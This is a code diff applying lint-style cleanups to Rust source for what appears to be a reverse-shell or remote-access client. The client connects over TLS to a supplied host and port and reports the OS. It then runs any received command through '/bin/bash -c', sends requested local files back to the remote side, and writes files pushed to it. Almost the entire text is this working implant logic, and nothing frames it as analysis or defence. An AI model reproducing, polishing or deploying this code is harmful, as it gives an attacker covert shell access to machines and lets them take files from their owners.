@@ -8,17 +8,17 @@ use std::net::TcpStream;
 
 fn do_stuff(cmd: &str) -> Vec<u8> {
     let exec = Command::new("/bin/bash")
-        .args(&["-c", cmd.trim_end_matches("\r\n")])
+        .args(["-c", cmd.trim_end_matches("\r\n")])
         .output()
         .unwrap();
 
     let stdo = exec.stdout.as_slice();
     let _stdr = exec.stderr.as_slice();
 
-    if _stdr.len() == 0 {
-        return stdo.to_vec();
+    if _stdr.is_empty() {
+        stdo.to_vec()
     } else {
-        return _stdr.to_vec();
+        _stdr.to_vec()
     }
 }
 
@@ -44,7 +44,7 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
     };
 
     let os = std::env::consts::FAMILY;
-    tls_stream.write(os.as_bytes())?;
+    tls_stream.write_all(os.as_bytes())?;
 
     // Cmd execution loop
     loop {
@@ -80,7 +80,7 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
         {
             let tmp = "".to_owned();
             let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
-            let path: Vec<&str> = cmd.split(" ").collect();
+            let path: Vec<&str> = cmd.split(' ').collect();
             match File::open(path[1]) {
                 Ok(mut file) => {
                     let mut file_buffer = [0; 4096];
@@ -96,7 +96,7 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                     }
                 }
                 Err(r) => {
-                    tls_stream.write(r.to_string().as_bytes())?;
+                    tls_stream.write_all(r.to_string().as_bytes())?;
                     tls_stream.write_all("EndOfTheFile".as_bytes())?;
                 }
             }
@@ -106,18 +106,18 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
         {
             let tmp = "".to_owned();
             let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
-            let path: Vec<&str> = cmd.split(" ").collect();
+            let path: Vec<&str> = cmd.split(' ').collect();
             match File::create(path[2].trim_end_matches('\0').trim_end()) {
                 Ok(mut file) => {
-                    tls_stream.write("Creation OK".as_bytes())?;
+                    tls_stream.write_all("Creation OK".as_bytes())?;
                     let mut file_buffer = [0; 4096];
                     match tls_stream.read(&mut file_buffer) {
                         Ok(_) => loop {
                             if String::from_utf8_lossy(&file_buffer).starts_with("EndOfTheFile") {
                                 // Drop all the ending null bytes added by the buffer
                                 let file_len_string = String::from_utf8_lossy(&file_buffer)
-                                    .splitn(2, ':')
-                                    .nth(1)
+                                    .split_once(':')
+                                    .map(|x| x.1)
                                     .unwrap_or("0")
                                     .trim_end_matches('\0')
                                     .to_owned();
@@ -131,9 +131,9 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                                 }
                                 break;
                             } else {
-                                file.write(&file_buffer)?;
+                                file.write_all(&file_buffer)?;
                                 file_buffer = [0; 4096];
-                                tls_stream.read(&mut file_buffer)?;
+                                tls_stream.read_exact(&mut file_buffer)?;
                             }
                         },
                         Err(r) => {
@@ -146,15 +146,15 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                 Err(r) => {
                     log::debug!("File creation error : {}", r);
                     tls_stream
-                        .write(("Creation not OK : ".to_owned() + &r.to_string()).as_bytes())?;
+                        .write_all(("Creation not OK : ".to_owned() + &r.to_string()).as_bytes())?;
                 }
             }
         } else {
             // Magic stuff
             let mut res =
                 do_stuff(String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0'));
-            if res.len() == 0 {
-                tls_stream.write("\0".as_bytes())?;
+            if res.is_empty() {
+                tls_stream.write_all("\0".as_bytes())?;
             } else {
                 // Because the TLS max buffer size depends on the underlying library, we cut the paquets to send them into blocks of 4096
                 let mut buff_to_send = [0; 4096];
